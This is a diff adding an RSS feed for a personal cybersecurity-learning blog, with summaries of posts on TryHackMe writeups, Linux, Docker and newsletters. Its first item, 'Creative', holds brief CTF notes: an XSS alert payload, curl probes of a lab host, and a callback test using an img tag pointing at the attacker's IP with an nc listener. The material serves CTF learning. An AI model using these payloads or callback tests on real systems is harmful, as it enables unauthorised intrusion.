@@ -1,0 +1,1360 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Mr Ash Co</title>
+    <link>//localhost:1313/</link>
+    <description>Recent content on Mr Ash Co</description>
+    <image>
+      <title>Mr Ash Co</title>
+      <url>//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 26 May 2024 17:13:48 +1000</lastBuildDate><atom:link href="//localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Creative</title>
+      <link>//localhost:1313/creative/</link>
+      <pubDate>Sun, 26 May 2024 17:13:48 +1000</pubDate>
+      
+      <guid>//localhost:1313/creative/</guid>
+      <description>To try
+SQL Injection (SQLi) Cross-Site Scripting (XSS) &amp;lt;script&amp;gt; alert(&amp;quot;XSS&amp;quot;);&amp;lt;/script&amp;gt; Local File Inclusion (LFI) Remote File Inclusion (RFI) Server-Side Request Forgery (SSRF) Directory Traversal Command Injection http://example.com/ alert(&amp;ldquo;XSS&amp;rdquo;); # Made it hang for a while
+curl &amp;lsquo;http://beta.creative.thm/&#39; -X HEAD -H &amp;lsquo;Content-Type: application/x-www-form-urlencoded&amp;rsquo; &amp;ndash;data-raw &amp;lsquo;url=&amp;quot;&amp;quot;&amp;rsquo;
+curl &amp;lsquo;http://beta.creative.thm/&#39; -I
+Quick reverse connection test
+&amp;lt;img src=&amp;quot;http://$YOUR_IP/&amp;quot; /&amp;gt; nc -lnvp 80 Thanks for reading</description>
+    </item>
+    
+    <item>
+      <title>CyberLens TryHackMe Writeup</title>
+      <link>//localhost:1313/cyberlens/</link>
+      <pubDate>Fri, 24 May 2024 12:05:12 +1000</pubDate>
+      
+      <guid>//localhost:1313/cyberlens/</guid>
+      <description>Okay, it&amp;rsquo;s been a while. Last writeup on the blog is Chill Hack&amp;hellip; but she (and other writeups) need a refresher.
+Anyway, here&amp;rsquo;s CyberLens, a newish TryHackMe room from Tyler Ramsbey who make&amp;rsquo;s great content, give them a follow/subscribe.
+The Challenge First up, the Challenge Description.
+Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image.</description>
+    </item>
+    
+    <item>
+      <title>Docker</title>
+      <link>//localhost:1313/docker/</link>
+      <pubDate>Fri, 24 May 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/docker/</guid>
+      <description>Let&amp;rsquo;s learn Docker and set it up.
+So what&amp;rsquo;s Docker?
+Well it&amp;rsquo;s complicated.
+It&amp;rsquo;s a way to install, maintain and run applications.
+But apps are self-contained, hence the term containers.
+Docker allows networking and lots more.
+Installing Docker Best way is to follow the docs.
+Kali Linux If you&amp;rsquo;re on Kali Linux, don&amp;rsquo;t follow the official guide.
+Go to Installing Docker on Kali Linux from Kali.org instead.
+sudo apt update sudo apt install -y docker.</description>
+    </item>
+    
+    <item>
+      <title>Syncthing</title>
+      <link>//localhost:1313/syncthing/</link>
+      <pubDate>Fri, 22 Dec 2023 06:18:12 +1000</pubDate>
+      
+      <guid>//localhost:1313/syncthing/</guid>
+      <description>Let&amp;rsquo;s install syncthing on Windows. Open Terminal &amp;gt; type winget install synctrayzor.
+This is a standalone app that just makes using syncthing more user friendly.
+Synctrayzor should be in your taskbar, click it to open the GUI.
+Go to Actions &amp;gt; Settings &amp;gt; Connections &amp;gt; Untick &amp;lsquo;Global Discovery&amp;rsquo; and &amp;lsquo;Enable Relaying&amp;rsquo;.
+Thanks for reading</description>
+    </item>
+    
+    <item>
+      <title>Remote Desktop Protocol</title>
+      <link>//localhost:1313/rdp/</link>
+      <pubDate>Thu, 21 Dec 2023 10:06:22 +1000</pubDate>
+      
+      <guid>//localhost:1313/rdp/</guid>
+      <description>Let&amp;rsquo;s setup Remote Desktop Protocol on Ubuntu.
+Start with following this guide.
+Make sure you&amp;rsquo;re not logged in as the same user, thanks to this.
+If you&amp;rsquo;re using a laptop, thanks to this.
+sudo nano /etc/systemd/logind.conf HandleSuspendKey=ignoreHandleHibernateKey=ignoreHandleLidSwitch=ignoreHandleLidSwitchExternalPower=ignoreHandleLidSwitchDocked=ignore Thanks for reading</description>
+    </item>
+    
+    <item>
+      <title>Winget</title>
+      <link>//localhost:1313/winget/</link>
+      <pubDate>Wed, 20 Dec 2023 11:06:47 +1000</pubDate>
+      
+      <guid>//localhost:1313/winget/</guid>
+      <description>How to use winget for Windows 11.
+What is winget? It&amp;rsquo;s a package manager for Windows, like choco or apt for debian based linux distros.
+If that means nothing to you, then it installs and updates apps. Cool? Cool.
+How to use winget Let&amp;rsquo;s install syncthing for this example.
+winget search sync displays a list of matches sync.
+Name Id Version Match Source--------------------------------------------------------------------syncthing Syncthing.Syncthing 1.27.0 wingetSyncTrayzor SyncTrayzor.SyncTrayzor 1.</description>
+    </item>
+    
+    <item>
+      <title>Pi-Hole</title>
+      <link>//localhost:1313/pihole/</link>
+      <pubDate>Mon, 18 Dec 2023 12:09:01 +1000</pubDate>
+      
+      <guid>//localhost:1313/pihole/</guid>
+      <description>Let&amp;rsquo;s setup Pi-Hole in Docker, following the official documentation.
+getconf LONG_BIT check for 32bit or 64bit. cat /etc/os-release check the version of the OS. After following the installation guide, you might receive these errors:
+E: Package &amp;#39;docker-ce&amp;#39; has no installation candidateE: Unable to locate package docker-ce-cliE: Unable to locate package containerd.ioE: Couldn&amp;#39;t find any package by glob &amp;#39;containerd.io&amp;#39;E: Couldn&amp;#39;t find any package by regex &amp;#39;containerd.io&amp;#39;E: Unable to locate package docker-buildx-pluginE: Unable to locate package docker-compose-**plugin** Switch over to this guide to manually install docker with the deb files.</description>
+    </item>
+    
+    <item>
+      <title>Hack Box</title>
+      <link>//localhost:1313/hack-box/</link>
+      <pubDate>Fri, 15 Dec 2023 19:53:10 +1000</pubDate>
+      
+      <guid>//localhost:1313/hack-box/</guid>
+      <description>Let&amp;rsquo;s setup a new &amp;ldquo;Hack Box&amp;rdquo; for TryHackMe challenges and Capture The Flags (CTFs).
+Previously, I&amp;rsquo;ve always used Kali Rolling inside of VirtualBox. But let&amp;rsquo;s try and get away from Virtual Machines (VMs).
+Why? Mainly the boot times, slow browsing and general laggy annoyances.
+I want a fast, simple system without the need to boot a VM and deal with stutters.
+The thinking is, use Windows Subset for Linux (WSL) with headless Kali Linux.</description>
+    </item>
+    
+    <item>
+      <title>Hack Notes</title>
+      <link>//localhost:1313/hacknotes/</link>
+      <pubDate>Fri, 15 Dec 2023 15:47:45 +1000</pubDate>
+      
+      <guid>//localhost:1313/hacknotes/</guid>
+      <description>🚩 A collection of notes, commands, &amp;amp; links to help w/ hacking &amp;amp; cybersec. Work in progress, please be patient while it’s updated.
+CyberChef // GTFOBins // HackTricks // RevShells // PayloadsAllTheThings
+🔥 Kill Chain General
+CTRL + SHIFT + UP|DOWN # scroll
+CTRL + SHIFT C|V # Copy|Paste
+nl # cat w/ line nums
+sed # stream editor
+ip= # set alias env var
+echo $ip # test alias</description>
+    </item>
+    
+    <item>
+      <title>Git</title>
+      <link>//localhost:1313/git/</link>
+      <pubDate>Fri, 15 Dec 2023 11:51:09 +1000</pubDate>
+      
+      <guid>//localhost:1313/git/</guid>
+      <description>Just a few notes/things to remember while using git.
+Typical git process:
+git pull $link git add . git commit -m &#39;v0.1&#39; git push $link Switch branches from master to main
+git branch -m master main </description>
+    </item>
+    
+    <item>
+      <title>Chill Hack</title>
+      <link>//localhost:1313/chill-hack/</link>
+      <pubDate>Fri, 08 Dec 2023 05:23:04 +1000</pubDate>
+      
+      <guid>//localhost:1313/chill-hack/</guid>
+      <description>Chill Hack CTF from TryHackMe, enjoy. </description>
+    </item>
+    
+    <item>
+      <title>Opacity TryHackMe</title>
+      <link>//localhost:1313/opacity/</link>
+      <pubDate>Fri, 08 Dec 2023 04:52:51 +1000</pubDate>
+      
+      <guid>//localhost:1313/opacity/</guid>
+      <description>TryHackMe&amp;rsquo;s Opacity is a &amp;rsquo;easy&amp;rsquo; Boot2Root room for pentesters and cybersec enthusiasts (like you!). Plus, for black friday, checkout the free giveaway bundles below. </description>
+    </item>
+    
+    <item>
+      <title>Policies</title>
+      <link>//localhost:1313/policies/</link>
+      <pubDate>Wed, 06 Dec 2023 22:55:41 +1000</pubDate>
+      
+      <guid>//localhost:1313/policies/</guid>
+      <description>Who we are Our website address is: https://mrash.co.
+What personal data we collect and why we collect it
+Comments When visitors leave comments on the site we collect the data shown in the comments form, and also the visitor’s IP address and browser user agent string to help spam detection.
+An anonymized string created from your email address (also called a hash) may be provided to the Gravatar service to see if you are using it.</description>
+    </item>
+    
+    
+    
+    <item>
+      <title>Now</title>
+      <link>//localhost:1313/now/</link>
+      <pubDate>Sun, 03 Dec 2023 18:47:12 +1000</pubDate>
+      
+      <guid>//localhost:1313/now/</guid>
+      <description>Hi, I’m Ash. I’m an IT teacher, learning cybersec, python and hacking.
+Goals For Focus
+Making weekly YouTube videos. Publishing monthly newsletters. Publishing regular blog posts. Goal
+2-5k YouTube subscribers, 400-500 newsletter friends, and 1-2k monthly views/visitors. Annual Reviews
+2023 2022 2021- Some Loves
+Slow-burn movies e.g. Whiplash, Uncut Gems and Joker. Fine wining/dining like Candian Club and Malibu. Travelling to New York, Singapore, and the Living Room. Timeline
+2012-14: Studied 2016-20: Businesses 2018-21: Classroom Teacher 2022-Present: Online Teacher Thanks For Reading ☕ I’ll Buy You A Coffee</description>
+    </item>
+    
+    <item>
+      <title>Curious</title>
+      <link>//localhost:1313/curious/</link>
+      <pubDate>Wed, 01 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/curious/</guid>
+      <description>“I’m curious,” has become my favourite phrase to use in conversation. Curiosity is pretty awesome. It draws us to people, places and interesting things. It can influence important decisions and spark lifelong pathways. Let’s dive into curiosity more.
+Hi, I’m Ash, a 27 y/o cybersec enthusiast journaling my journey on productivity &amp;amp; hacking. You’ve received a copy of the Monthly Monitor as you subscribed via the site or accessed a product.</description>
+    </item>
+    
+    <item>
+      <title>2022 Annual Review</title>
+      <link>//localhost:1313/2022/</link>
+      <pubDate>Thu, 19 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/2022/</guid>
+      <description>Welcome to my 4th Annual Review, can you believe 2022 is over? It&amp;rsquo;s been a long 12 months, yet it’s gone so fast. Here&amp;rsquo;s my 2022 recap plus my plans for 2023. Note, if interested see 2019, 2020 and 2021.
+~ Hi, my name’s Ash, I’m 27 and a cyber security enthusiast sharing my journey. You’ve received this newsletter as you subscribed via my website or downloaded a freebie. ~</description>
+    </item>
+    
+    <item>
+      <title>How To Fix TryHackMe VPN Not Working</title>
+      <link>//localhost:1313/how-to-fix-tryhackme-vpn-not-working-troubleshooting-openvpn/</link>
+      <pubDate>Sat, 22 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/how-to-fix-tryhackme-vpn-not-working-troubleshooting-openvpn/</guid>
+      <description>Is your TryHackMe OpenVPN not working?
+Let’s fix it, here’s what you’ll need:
+Some computer networking knowledge. A TryHackMe account. An OpenVPN config file via Network Access. Alright, so your there’s a few problems when trying to connect with OpenVPN to TryHackMe. Let’s cover them and learn how to fix connection problems in TryHackMe, let’s go.
+How Do I Use OpenVPN On TryHackMe? First you need to have an active account with an OpenVPN config file generated and downloaded to your system.</description>
+    </item>
+    
+    <item>
+      <title>100 Days Of Hacking</title>
+      <link>//localhost:1313/100daysofhacking/</link>
+      <pubDate>Mon, 17 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/100daysofhacking/</guid>
+      <description>Programming, terminals, networking, and pen testing. There’s a lot to love in computer hacking.
+Are you learning to hack?
+Maybe you’ve started but can’t keep motivated or you might not know where to start, let’s fix that!
+Here’s 100 days of hacking, a flexible learning path to keep you on track.
+Are you in? Yes, good, let’s go!
+*Disclaimer, this is designed for self-paced learning and uses multiple resources from various creators.</description>
+    </item>
+    
+    <item>
+      <title>Crack The Hash TryHackMe Walkthrough</title>
+      <link>//localhost:1313/crack-the-hash-tryhackme-walkthrough/</link>
+      <pubDate>Mon, 17 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/crack-the-hash-tryhackme-walkthrough/</guid>
+      <description>Let’s tackle Crack The Hash, another TryHackMe room full of hash-cracking challenges.
+If you’d like a video walkthrough, then see the linked video below for a full guide to Crack The Hash.
+Quickly, what is a hash and hashing in general?
+“Hashing serves the purpose of ensuring integrity, i.e. making it so that if something is changed you can know that it’s changed. Technically, hashing takes arbitrary input and produce a fixed-length string…” — Daniel Miessler, Hashing vs.</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire: Bandit</title>
+      <link>//localhost:1313/overthewire-bandit/</link>
+      <pubDate>Fri, 07 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/overthewire-bandit/</guid>
+      <description>Bandit is a beginner Capture The Flag (CTF) game from OverTheWire (OTW).
+Whether you’re familiar with text-based games or have never even thought of playing them (me). This is the perfect CTF for learning Linux.
+You’re here to either copy my answers OR learn. Can I ask you to please focus on the learning? It’s okay to peak when you’re so blind it’s crippling you, but please don’t just copy, copy, copy!</description>
+    </item>
+    
+    <item>
+      <title>I Won</title>
+      <link>//localhost:1313/i-won/</link>
+      <pubDate>Wed, 05 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/i-won/</guid>
+      <description>We’ve made it to October so let’s recap last month and catch up. Here’s a quick story I wanted to share with you about my first coding competition. Disclaimer, you’ve received this newsletter as you subscribed to Mr Ash .co. Note, the August newsletter wasn’t published via email but is now live.
+I Won My First Coding Competition It’s early July and I’m scrolling Discord where I find myself on the W3Schools server.</description>
+    </item>
+    
+    <item>
+      <title>AFK Aug</title>
+      <link>//localhost:1313/afk/</link>
+      <pubDate>Wed, 31 Aug 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/afk/</guid>
+      <description>Hi friend,
+Are you stressed? Most people are despite the ease of modern living. What&amp;rsquo;s something we can do to combat work-life stresses? Disclaimer, you’ve received this newsletter as you’ve subscribed to Mr Ash.co. Note, this month has a shortened newsletter.
+AFK Away From Keyboard (AFK), coined by PC gamers to quickly chat “I’m getting food, don&amp;rsquo;t kill me in game” or something similar. I still use AFK today in work meetings.</description>
+    </item>
+    
+    <item>
+      <title>Replit EdFest 2022 Jam - Intro To PyScript</title>
+      <link>//localhost:1313/replit-edfest-2022-jam-intro-to-pyscript/</link>
+      <pubDate>Thu, 28 Jul 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/replit-edfest-2022-jam-intro-to-pyscript/</guid>
+      <description>ATTENTION! If you’d like to do the course yourself, join up using this link for FREE.
+And don’t forget to watch the video walkthrough.
+Welcome to your Intro to PyScript, a simple replit that teaches you the basics of the modern Python web dev technology. You’re going to set up your own simple HTML page with a linked Python program. You’ll enable PyScript, take user data, run it through your program and print it back out to the user.</description>
+    </item>
+    
+    <item>
+      <title>Network Services 2 P3 MySQL - TryHackMe Walkthrough</title>
+      <link>//localhost:1313/tyryhackme-network-services-2-p3-mysql/</link>
+      <pubDate>Tue, 19 Jul 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/tyryhackme-network-services-2-p3-mysql/</guid>
+      <description>Welcome back to another video.
+We are going to be doing Network Servicestwo, part three
+enumerating exploiting more commonnetwork Services and misconfigs.
+We’re up to task eight, nine and ten,
+and we’ll finish off with elevenrounding out this whole thing.
+Cool.
+All right, let’s start off with taskeight, understanding MySQL.
+Just before I do, got to remind you,
+if you want a written write up,you can catch the link to that below.</description>
+    </item>
+    
+    <item>
+      <title>Network Services 2 TryHackMe Part 2 SMTP</title>
+      <link>//localhost:1313/network-services-2-tryhackme-part-2-smtp/</link>
+      <pubDate>Tue, 19 Jul 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/network-services-2-tryhackme-part-2-smtp/</guid>
+      <description>Welcome back.
+We are going to be doing the restof Network services two.
+And this is now part two.
+We’re going on to SMTP.
+So we’re going to be doingtasks five, six and seven.
+And then we’ll be finishing off8910 eleven in the next video.
+If you want a written write up,the link will be below.
+And if you need anythingelse, please reach out.
+And if you want to like videosubscribe, do all that stuff.</description>
+    </item>
+    
+    <item>
+      <title>CS50P Problem Set Guide</title>
+      <link>//localhost:1313/cs50-python-problem-set-guide/</link>
+      <pubDate>Sun, 17 Jul 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/cs50-python-problem-set-guide/</guid>
+      <description>Hello, world and welcome, this is a breakdown, or guide, to the problem sets (psets) to CS50’s Introduction to Programming with Python (CS50P).
+If you’re unaware, CS50 Python comes from Havard which operates edx CS50. It’s a great introduction to the programming language Python. If you’re brand new to Computer Science (CS) or have a background in technology, CS50 covers the fundamentals really well. It’s one of the best places to learn Python online.</description>
+    </item>
+    
+    <item>
+      <title>Agent Sudo TryHackMe Walkthrough</title>
+      <link>//localhost:1313/agent-sudo/</link>
+      <pubDate>Sat, 09 Jul 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/agent-sudo/</guid>
+      <description>Welcome back to another TryHackMe room, the challenge today is Agent Sudo.
+No spoilers below within the hints, just some good ol’ fashion hints to help you out on your agent sudo journey. For more detail, with some spoilers, see the steps section, and for everything I did, see my notes. If you prefer a video walkthrough, well that’s linked below, and if you want my personal thoughts on the room, check out the reflection via the video.</description>
+    </item>
+    
+    <item>
+      <title>OhSINT Writeup TryHackMe</title>
+      <link>//localhost:1313/ohsint/</link>
+      <pubDate>Tue, 05 Jul 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/ohsint/</guid>
+      <description>Let’s go for another TryHackMe room, this time we’re tackling OhSINT, which begs the question “are you able to use open-source intelligence to solve this challenge?”
+This was a fun, different room for me, I love the idea of OSINT and using the web to solve challenges. Despite having a few initial issues along the way, it was fun to answer “what information can you possible get with just one photo?</description>
+    </item>
+    
+    <item>
+      <title>THM SimpleCTF Hints, Writeup and Notes</title>
+      <link>//localhost:1313/simplectf/</link>
+      <pubDate>Sun, 03 Jul 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/simplectf/</guid>
+      <description>Welcome back to TryHackMe, this time it’s SimpleCTF… or as I’d call it ‘Not So SimpleCTF’… as I had a few issues getting this CTF to work.
+Let’s dive into it.
+Hints How many services are running under port 1000? nmap What is running on the higher port? Check the nmap scan results. What’s the CVE you’re using against the application? CVE-****-**** don’t forget to include CVE- at the beginning. To what kind of vulnerability is the application vulnerable?</description>
+    </item>
+    
+    <item>
+      <title>Easily Learn Difficult Things: Object Orientated Programming</title>
+      <link>//localhost:1313/easily-learn-difficult-things-object-orientated-programming/</link>
+      <pubDate>Wed, 22 Jun 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/easily-learn-difficult-things-object-orientated-programming/</guid>
+      <description>I&amp;rsquo;m a big fan of YouTuber Ali Abdaal, his ex-PA now turned YouTuber Elizabeth Flipis has a great channel. She creates content about herself living in London while studying Medschool.
+Her latest video You&amp;rsquo;re Not Stupid: How to Easily Learn Difficult Things caught my attention. As someone who feels dumb 90% of the time, this is perfect, and the timing couldn&amp;rsquo;t be better as I&amp;rsquo;m learning computer science and programming.</description>
+    </item>
+    
+    <item>
+      <title>Automate The Boring Stuff With Python Practice Projects</title>
+      <link>//localhost:1313/automate-the-boring-stuff-with-python-practice-projects/</link>
+      <pubDate>Tue, 21 Jun 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/automate-the-boring-stuff-with-python-practice-projects/</guid>
+      <description>Automate The Boring Stuff With Python is an incredible book, and course by Al Sweigart to learn Python coding and computer science for the everyday person. With its straightforward learning approach, and succinct program examples and explanations, it’s many hobbyists’ go-to book for Python.
+This article breaks down my personal solutions to the practice projects outlined at the end of most chapters. As I continue to learn Python and generally computer science, I enjoy seeing how others solve coding problems.</description>
+    </item>
+    
+    <item>
+      <title>Privacy: Why You Should Care About Data</title>
+      <link>//localhost:1313/privacy-why-you-should-care-about-data/</link>
+      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/privacy-why-you-should-care-about-data/</guid>
+      <description>In March 2022, some friends of mine got scammed on Instagram. A scammer posing as a friend or work colleague tricked them into “helping” them out and took over their account.
+It’s motivated me to help those I know and love by being more aware of the dangers that lurk on the internet. The reality is, that the internet is full of your personally identifiable information (PII) being leaked and publically available.</description>
+    </item>
+    
+    <item>
+      <title>Learning HTTP Requests - A Mini HTTP Exercise</title>
+      <link>//localhost:1313/learning-http-requests-a-mini-http-exercise/</link>
+      <pubDate>Thu, 21 Apr 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/learning-http-requests-a-mini-http-exercise/</guid>
+      <description>While learning HTTP in Detail, I thought it’d be fun to put it to the test in the terminal.
+Here’s a quick exercise to practice learning HTTP Requests, Responses and Headers.
+Difficulty: Easy – new to Linux. Environment: local Debian-based Linux installation e.g. Ubuntu in VirtualBox. Commands: git, python3, cd, mkdir, wget. Steps Here’s everything you need to do, note, you’ll need two terminals to do this:
+Terminal 1: git clone https://github.</description>
+    </item>
+    
+    <item>
+      <title>TryHackMe Network Services 1 Part 2 Telnet</title>
+      <link>//localhost:1313/tryhackme-network-services-1-part-2-telnet/</link>
+      <pubDate>Fri, 01 Apr 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/tryhackme-network-services-1-part-2-telnet/</guid>
+      <description>Welcome to TryHackMe Network Services Walkthrough Part 2, oh yeah! Let’s learn, then enumerate and exploit a variety of network services and misconfigurations, second up is telnet. Watch this Network Services Walkthrough for TryHackMe’s room, Part 2 Telnet.
+Task 5 Understanding Telnet Questions:
+What is Telnet? application protocol What has slowly replaced Telnet? ssh How would you connect to a Telnet server with the IP 10.10.10.3 on port 23? telnet 10.</description>
+    </item>
+    
+    <item>
+      <title>TryHackMe Network Services 1 Part 3 FTP</title>
+      <link>//localhost:1313/tryhackme-network-services-1-part-3-ftp/</link>
+      <pubDate>Fri, 01 Apr 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/tryhackme-network-services-1-part-3-ftp/</guid>
+      <description>Let’s go, TryHackMe Network Services Walkthrough Part 3, welcome! Step 1 learn, step 2 enumerate, and step 3 exploit… but what? Well, a variety of network services and misconfigurations of course, this time it’s FTP. Watch the Network Services Walkthrough for TryHackMe’s room, Part 3 FTP.
+Task 8 Understanding FTP Questions:
+What communications model does FTP use? client-server What’s the standard FTP port? 21 How many modes of FTP connection are there?</description>
+    </item>
+    
+    <item>
+      <title>Hackers Learning Path</title>
+      <link>//localhost:1313/learning-path-for-beginner-hacker/</link>
+      <pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/learning-path-for-beginner-hacker/</guid>
+      <description>Want to hack computers? But what is hacking and how do people learn it?
+Here’s a vetted list of resources to learn computer hacking. Starting out is hard work, so that’s why I’ve put this list together, to help demystify hacking for you.
+The good news is anyone (including you) can learn to hack, and in even better news, it’s a lot of fun. All you need is effort and time, most of the resources are completely free.</description>
+    </item>
+    
+    <item>
+      <title>Updating Domains with Cloudways • 301 Redirects</title>
+      <link>//localhost:1313/updating-domains-with-cloudways-301-redirects/</link>
+      <pubDate>Tue, 29 Mar 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/updating-domains-with-cloudways-301-redirects/</guid>
+      <description>So you’re updating domains, but what about your search rankings? I just did this myself and it wasn’t as hard as I expected.
+Disclaimer, if you need help, read .htaccess file and SSH setup.
+HTACCESS File If you’re running a Content Delivery Network (CDN), turn off caching. For example, Cloudflare Dashboard &amp;gt; turn on development mode.
+Next, connect to your server via SSH.
+ssh &amp;lt;username&amp;gt;@&amp;lt;ip&amp;gt; nano .htaccess Copy the text below, replace the placeholder text.</description>
+    </item>
+    
+    <item>
+      <title>Cowsays What CTF - A Beginner Linux Project</title>
+      <link>//localhost:1313/cowsays-what-ctf/</link>
+      <pubDate>Wed, 23 Mar 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/cowsays-what-ctf/</guid>
+      <description>Want a beginner Linux CTF (Capture The Flag)? Moove over, here’s Cowsays What CTF. A simple question-based python program to test your beginner Linux level skills.
+This simple CTF will use Linux commands to install a program, execute it and interact with it. Cowsays What CTF is inspired by TryHackMe and OverTheWire’s Bandit.
+*Disclaimer, if you need help getting started with Linux, see Linux Quick Start Guide.
+Getting Started Before you tackle the challenge, understand the scope, here’s what you need to know:</description>
+    </item>
+    
+    <item>
+      <title>TryHackMe Network Services Room Notes</title>
+      <link>//localhost:1313/tryhackme-network-services-room-notes/</link>
+      <pubDate>Sat, 19 Mar 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/tryhackme-network-services-room-notes/</guid>
+      <description>Are you going through TryHackMe’s Network Services 1 Room? Need help taking notes? I got you covered. Here are my Network Services 1 room notes from TryHackMe, use them as much as you need!
+Disclaimer, this is written in shorthand format, meaning, full sentences and proper grammar are not always used. For writeups, see SMB Part 1, for help with Linux, see Quick Start Guide.
+SMB: Understanding, Enumerating, Exploiting Server Message Block (SMB) Protocol: client/server comms for file/printer/serial ports/others for MS Windows.</description>
+    </item>
+    
+    <item>
+      <title>TryHackMe Nmap Walkthrough</title>
+      <link>//localhost:1313/tryhackme-nmap-walkthrough/</link>
+      <pubDate>Sat, 19 Mar 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/tryhackme-nmap-walkthrough/</guid>
+      <description>Welcome to another TryHackeMe Walkthrough, this time the Nmap room from TryHackMe’s Beginner Learning Path. In this TryHackMe Nmap Walkthrough, we’ll go over all 15 tasks and you’ll see every detail you need to not only complete the Nmap room but understand it too.
+For a quicker look at the Nmap Room, see TryHackMe Nmap Room Notes, enjoy the TryHackMe Nmap Walkthrough, happy hacking.
+Disclaimer, see the video version or the previous Linux Fundamentals Part 1, Part 2, or Part 3 if needed.</description>
+    </item>
+    
+    <item>
+      <title>TryHackMe Network Services Walkthrough SMB Part 1/3</title>
+      <link>//localhost:1313/tryhackme-network-services-walkthrough-smb-part-1-3/</link>
+      <pubDate>Fri, 18 Mar 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/tryhackme-network-services-walkthrough-smb-part-1-3/</guid>
+      <description>Task 1 Get Connected Questions
+Ready? Let’s get going! – No answer needed, carry on. Offline checklist to track your learning path, become a great hacker and stay on task.
+Task 2 Understanding SMB What does SMB stand for? – Server Message Block What type of protocol is SMB? – response-request What do clients connect to servers using? – TCP/IP What systems does Samba run on? – Unix Task 3 Enumerating SMB Run nmap scan.</description>
+    </item>
+    
+    <item>
+      <title>TryHackMe Nmap Room Notes</title>
+      <link>//localhost:1313/tryhackme-nmap-room-notes/</link>
+      <pubDate>Sat, 12 Mar 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/tryhackme-nmap-room-notes/</guid>
+      <description>Are you going through TryHackMe’s Nmap Room? Did you forget to take notes? I got you covered. Here are my Nmap room notes from TryHackMe, use them as much as you need!
+Disclaimer, this is written in shorthand format, meaning, full sentences and proper grammar are always not used. For a full writeup, see TryHackMe Nmap Walkthrough, for help with Linux, see Quick Start Guide.
+Task 1 Deploy &amp;amp; Task 2 Introduction Ports: allow multiple network services, ensure correct device communication, 65535 total.</description>
+    </item>
+    
+    <item>
+      <title>Linux Fundamentals 1 - TryHackMe Walkthrough</title>
+      <link>//localhost:1313/linux-fundamentals-1-tryhackme-walkthrough/</link>
+      <pubDate>Mon, 28 Feb 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/linux-fundamentals-1-tryhackme-walkthrough/</guid>
+      <description>Learning Linux? Great, me too!
+Here’s the Linux Fundamentals 1 Walkthrough from TryHackMe. Let’s take a look at some of the fundamentals of Linux including common commands, the terminal, your prompt and more. There’s lots to love in Linux, as there’s so many flavours or distributions, the possibilities are endless.
+I hope you learn something on your Linux journey! Enjoy TryHcakMe’s Linux Fundamentals 1.
+Disclaimer, for more TryHackMe walkthroughs, see Linux Fundamentals 2 or Linux Fundamentals 3.</description>
+    </item>
+    
+    <item>
+      <title>Linux Fundamentals 2 - TryHackMe Walkthrough</title>
+      <link>//localhost:1313/linux-fundamentals-2-tryhackme-walkthrough/</link>
+      <pubDate>Mon, 28 Feb 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/linux-fundamentals-2-tryhackme-walkthrough/</guid>
+      <description>So you’re learning Linux aye? Welcome aboard!
+Here’s the Linux Fundamentals 2 Walkthrough from TryHackMe. Let’s take a look at some of the fundamentals of Linux including some more commands, ssh, bash scripting and more.
+There’s lots to love in Linux, I hope you learn something here on your Linux journey! Enjoy TryHackMe’s Linux Fundamentals 2.
+Disclaimer, for more, see Linux Fundamentals 1, Linux Fundamentals 3 and Linux Quick Start Guide.</description>
+    </item>
+    
+    <item>
+      <title>Linux Fundamentals 3 TryHackMe Walkthrough</title>
+      <link>//localhost:1313/linux-fundamentals-3-tryhackme-walkthrough/</link>
+      <pubDate>Mon, 28 Feb 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/linux-fundamentals-3-tryhackme-walkthrough/</guid>
+      <description>Welcome to Linux Fundamentals 3 TryHackMe Walkthrough, the finale of the Linux Fundamental rooms on TryHackMe.
